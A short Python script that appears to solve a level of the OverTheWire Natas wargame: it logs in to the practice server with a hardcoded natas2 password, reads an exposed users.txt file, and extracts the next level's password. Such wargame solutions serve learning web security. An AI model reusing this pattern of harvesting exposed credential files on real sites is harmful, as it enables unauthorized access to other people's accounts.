import requests
import re

username = "natas2"
password = "ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi"
url = "http://%s.natas.labs.overthewire.org/files/users.txt" % username
response = requests.get(url , auth=(username,password))
flag = response.text
x = re.findall("natas3:(.*)",flag)

print(x)